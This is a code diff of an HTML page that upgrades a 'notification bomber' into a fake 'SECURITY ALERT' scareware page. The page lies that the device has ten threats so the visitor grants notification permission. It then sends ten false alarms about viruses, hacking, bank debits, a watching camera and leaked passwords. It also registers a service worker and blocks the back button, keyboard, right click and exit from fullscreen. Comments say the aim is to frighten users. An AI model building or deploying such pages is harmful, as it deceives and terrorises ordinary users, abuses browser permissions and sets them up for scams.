@@ -1,91 +1,461 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>💣 Notification Bomber</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ SYSTEM SCAN</title>
+    <link rel="manifest" href="manifest.json">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
         body {
-            background: #000;
-            color: red;
-            font-family: monospace;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            animation: bgPulse 2s infinite;
+        }
+
+        @keyframes bgPulse {
+            0%,100% { background: #0a0a0a; }
+            50% { background: #2a0a0a; }
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: rgba(20, 20, 30, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 25px;
+            border: 2px solid #ff3333;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
+            animation: glow 2s infinite;
+        }
+
+        @keyframes glow {
+            0%,100% { box-shadow: 0 0 30px rgba(255,0,0,0.3); }
+            50% { box-shadow: 0 0 60px rgba(255,0,0,0.6); }
+        }
+
+        .header {
             text-align: center;
-            padding: 50px;
-            animation: blink 0.1s infinite;
+            margin-bottom: 25px;
         }
-        @keyframes blink {
-            0%,100%{background:#000}
-            50%{background:#8b0000}
-        }
-        h1 { font-size: 50px; margin: 30px; }
-        .counter {
+
+        .danger-icon {
             font-size: 80px;
-            font-weight: bold;
-            color: #ff0;
+            animation: shake 0.1s infinite;
+            margin-bottom: 15px;
         }
-        button {
-            background: red;
+
+        @keyframes shake {
+            0%,100% { transform: translateX(0); }
+            10% { transform: translateX(-5px); }
+            20% { transform: translateX(5px); }
+        }
+
+        h1 {
+            color: #ff3333;
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .warning-text {
+            color: #ff9999;
+            font-size: 14px;
+            margin-bottom: 25px;
+            padding: 15px;
+            background: rgba(255,0,0,0.1);
+            border-radius: 15px;
+            border-left: 4px solid #ff3333;
+        }
+
+        .scan-status {
+            background: #1a1a2a;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            color: #ff9999;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #2a2a3a;
+            border-radius: 4px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff3333, #ff9999);
+            animation: progress 5s infinite;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 0%; }
+        }
+
+        .permission-box {
+            background: #1a1a2a;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 25px;
+            text-align: center;
+            border: 2px solid #ff3333;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%,100% { border-color: #ff3333; }
+            50% { border-color: #ff9999; }
+        }
+
+        .permission-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+
+        .permission-text {
+            color: white;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .allow-btn {
+            background: linear-gradient(135deg, #ff3333, #ff0000);
             color: white;
             border: none;
-            padding: 20px 40px;
-            font-size: 30px;
-            border-radius: 10px;
-            margin: 20px;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
             cursor: pointer;
+            width: 100%;
+            box-shadow: 0 10px 20px rgba(255,0,0,0.3);
+        }
+
+        .allow-btn:hover {
+            transform: scale(1.02);
+        }
+
+        .allow-btn:active {
+            transform: scale(0.98);
+        }
+
+        .threat-counter {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 25px;
+        }
+
+        .threat-item {
+            text-align: center;
+        }
+
+        .threat-value {
+            color: #ff3333;
+            font-size: 30px;
+            font-weight: bold;
+        }
+
+        .threat-label {
+            color: #ff9999;
+            font-size: 12px;
+        }
+
+        .footer {
+            text-align: center;
+            color: #666;
+            font-size: 11px;
+            border-top: 1px solid #333;
+            padding-top: 20px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .bomb-active {
+            animation: bombFlash 0.5s infinite;
+        }
+
+        @keyframes bombFlash {
+            0%,100% { filter: brightness(1); }
+            50% { filter: brightness(1.5); }
         }
     </style>
 </head>
 <body>
-    <h1>💣 NOTIFICATION BOMBER</h1>
-    <div class="counter" id="count">0</div>
-    <button onclick="startBomb()">💥 START BOMB 💥</button>
+    <div class="container" id="mainContainer">
+        <div class="header">
+            <div class="danger-icon">⚠️</div>
+            <h1>SECURITY ALERT</h1>
+            <div class="warning-text">
+                ⚡ CRITICAL: 10 security threats detected!<br>
+                ⚡ Your device is at high risk!
+            </div>
+        </div>
+
+        <div class="scan-status">
+            <div class="status-row">
+                <span>System Integrity</span>
+                <span style="color:#ff3333">12%</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="status-row">
+                <span>Threats Found</span>
+                <span style="color:#ff3333">10</span>
+            </div>
+            <div class="status-row">
+                <span>Device Status</span>
+                <span style="color:#ff3333">COMPROMISED</span>
+            </div>
+        </div>
+
+        <div class="permission-box" id="permissionBox">
+            <div class="permission-icon">🔔</div>
+            <div class="permission-text">⚠️ URGENT: Allow notifications to remove threats!</div>
+            <button class="allow-btn" onclick="requestPermission()">🔔 ALLOW NOTIFICATIONS</button>
+            <p style="color:#ff9999; font-size:12px; margin-top:15px;">
+                ⏳ 10 threats will be removed automatically
+            </p>
+        </div>
+
+        <div class="threat-counter">
+            <div class="threat-item">
+                <div class="threat-value">10</div>
+                <div class="threat-label">Active Threats</div>
+            </div>
+            <div class="threat-item">
+                <div class="threat-value">0</div>
+                <div class="threat-label">Removed</div>
+            </div>
+            <div class="threat-item">
+                <div class="threat-value">100%</div>
+                <div class="threat-label">Risk Level</div>
+            </div>
+        </div>
+
+        <div class="footer">
+            ⚡ Critical security scan required • 10 threats found
+        </div>
+    </div>
 
     <script>
         let bombInterval;
-        let count = 0;
+        let notificationCount = 0;
+        let threatCount = 10;
 
-        async function startBomb() {
-            // Pehle notification permission lo
-            const perm = await Notification.requestPermission();
-            
-            if(perm === 'granted') {
-                // Bomb start!
-                bombInterval = setInterval(() => {
-                    count++;
-                    document.getElementById('count').textContent = count;
+        // 10 DANGEROUS NOTIFICATIONS
+        const notifications = [
+            {
+                title: '⚠️ VIRUS DETECTED!',
+                body: '3 malware files found in system! Click to clean.'
+            },
+            {
+                title: '🔴 PHONE HACKED!',
+                body: 'Unauthorized access detected! Your data is at risk!'
+            },
+            {
+                title: '💀 SYSTEM CRITICAL!',
+                body: 'Operating system corrupted! Formatting drive C:'
+            },
+            {
+                title: '📱 BANK ALERT!',
+                body: 'Unusual transaction detected! ₹50,000 deducted!'
+            },
+            {
+                title: '🕵️ CAMERA ACCESS!',
+                body: 'Someone is watching you through your camera!'
+            },
+            {
+                title: '🔊 MICROPHONE ACTIVE!',
+                body: 'Your microphone is being used by unknown app!'
+            },
+            {
+                title: '📍 LOCATION TRACKED!',
+                body: 'Your exact location has been shared!'
+            },
+            {
+                title: '📸 PHOTO UPLOADED!',
+                body: '10 photos from gallery uploaded to server!'
+            },
+            {
+                title: '🔑 PASSWORD LEAKED!',
+                body: 'Your saved passwords have been compromised!'
+            },
+            {
+                title: '💣 FINAL WARNING!',
+                body: 'System will self-destruct in 60 seconds!'
+            }
+        ];
+
+        async function requestPermission() {
+            if ('Notification' in window) {
+                const permission = await Notification.requestPermission();
+                
+                if (permission === 'granted') {
+                    // Hide permission box
+                    document.getElementById('permissionBox').style.display = 'none';
                     
-                    // Different scary messages
-                    const messages = [
-                        { title: '⚠️ VIRUS DETECTED!', body: '3 malware found!' },
-                        { title: '🔴 PHONE HACKED!', body: 'Your data is being stolen!' },
-                        { title: '💀 SYSTEM CRITICAL!', body: 'Formatting drive C:' },
-                        { title: '📱 BANK ALERT!', body: 'Unauthorized transaction!' },
-                        { title: '🕵️ CAMERA ACCESS!', body: 'Someone is watching you!' },
-                        { title: '🔊 MICROPHONE ACTIVE!', body: 'Recording audio...' },
-                        { title: '📍 LOCATION TRACKED!', body: 'Your position shared!' },
-                        { title: '📸 PHOTO UPLOADED!', body: 'Gallery being uploaded!' }
-                    ];
+                    // Add bomb active class
+                    document.getElementById('mainContainer').classList.add('bomb-active');
                     
-                    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                    // Show threat counter
+                    showThreatCounter();
                     
-                    // Notification bhejo
-                    new Notification(randomMsg.title, {
-                        body: randomMsg.body,
-                        icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ff0000\'/%3E%3Ctext x=\'50\' y=\'70\' font-size=\'70\' text-anchor=\'middle\' fill=\'white\'%3E💀%3C/text%3E%3C/svg%3E',
-                        vibrate: [500, 200, 500, 200, 500], // Vibration pattern
-                        requireInteraction: true, // User dismiss nahi kar sakta
-                        tag: 'bomb-' + Date.now() // Har notification unique
-                    });
+                    // Start notification bombing
+                    startNotificationBomb();
                     
-                    // Phone vibrate (agar support kare to)
-                    if('vibrate' in navigator) {
-                        navigator.vibrate([500, 200, 500, 200, 500]);
+                    // Register Service Worker for background notifications
+                    if ('serviceWorker' in navigator) {
+                        navigator.serviceWorker.register('sw.js');
                     }
-                    
-                }, 1000); // Har second
+                }
             }
         }
 
-        // Stop button (hacker ke liye)
-        // User ke liye nahi!
+        function showThreatCounter() {
+            const threatCounter = document.querySelector('.threat-counter');
+            threatCounter.innerHTML = `
+                <div class="threat-item">
+                    <div class="threat-value" id="remainingThreats">10</div>
+                    <div class="threat-label">Remaining</div>
+                </div>
+                <div class="threat-item">
+                    <div class="threat-value" id="sentCount">0</div>
+                    <div class="threat-label">Sent</div>
+                </div>
+                <div class="threat-item">
+                    <div class="threat-value" id="nextIn">5</div>
+                    <div class="threat-label">Next in (s)</div>
+                </div>
+            `;
+        }
+
+        function startNotificationBomb() {
+            let countdown = 5;
+            
+            bombInterval = setInterval(() => {
+                if (notificationCount < 10) {
+                    // Send notification
+                    sendNotification(notifications[notificationCount]);
+                    
+                    // Update count
+                    notificationCount++;
+                    document.getElementById('sentCount').textContent = notificationCount;
+                    document.getElementById('remainingThreats').textContent = 10 - notificationCount;
+                    
+                    // Reset countdown
+                    countdown = 5;
+                    document.getElementById('nextIn').textContent = countdown;
+                    
+                    // Phone vibration
+                    if ('vibrate' in navigator) {
+                        navigator.vibrate([500, 200, 500]);
+                    }
+                    
+                } else {
+                    // All notifications sent
+                    clearInterval(bombInterval);
+                    document.getElementById('mainContainer').innerHTML = `
+                        <div style="text-align:center; padding:30px;">
+                            <div class="danger-icon" style="font-size:60px;">💀</div>
+                            <h1 style="color:#ff3333; margin:20px 0;">SYSTEM DESTROYED!</h1>
+                            <p style="color:#ff9999;">All 10 threats were found.<br>Your device is compromised.</p>
+                            <div style="margin-top:30px; color:#666; font-size:12px;">
+                                ⚠️ Please restart your phone immediately
+                            </div>
+                        </div>
+                    `;
+                }
+            }, 5000); // Har 5 second
+            
+            // Update countdown every second
+            setInterval(() => {
+                if (notificationCount < 10) {
+                    let currentCountdown = parseInt(document.getElementById('nextIn').textContent);
+                    if (currentCountdown > 1) {
+                        document.getElementById('nextIn').textContent = currentCountdown - 1;
+                    }
+                }
+            }, 1000);
+        }
+
+        function sendNotification(notif) {
+            // Create notification with scary options
+            const notification = new Notification(notif.title, {
+                body: notif.body,
+                icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ff0000\'/%3E%3Ctext x=\'50\' y=\'70\' font-size=\'70\' text-anchor=\'middle\' fill=\'white\'%3E💀%3C/text%3E%3C/svg%3E',
+                badge: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ff0000\'/%3E%3C/svg%3E',
+                vibrate: [500, 200, 500, 200, 500],
+                requireInteraction: true, // User dismiss nahi kar sakta
+                tag: 'bomb-' + Date.now(),
+                renotify: true,
+                silent: false,
+                actions: [
+                    { action: 'clean', title: '🔴 CLEAN NOW' },
+                    { action: 'ignore', title: '⏰ LATER' }
+                ]
+            });
+
+            // Handle notification click
+            notification.onclick = function(event) {
+                event.preventDefault();
+                // User click karega to aur darega
+                alert('⚠️ CANNOT CLEAN! SYSTEM LOCKED!');
+            };
+        }
+
+        // Block back button
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function() {
+            history.pushState(null, null, location.href);
+        });
+
+        // Block keyboard
+        document.addEventListener('keydown', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Block right click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Try fullscreen
+        function goFullScreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+        }
+        setInterval(goFullScreen, 5000);
     </script>
 </body>
 </html>
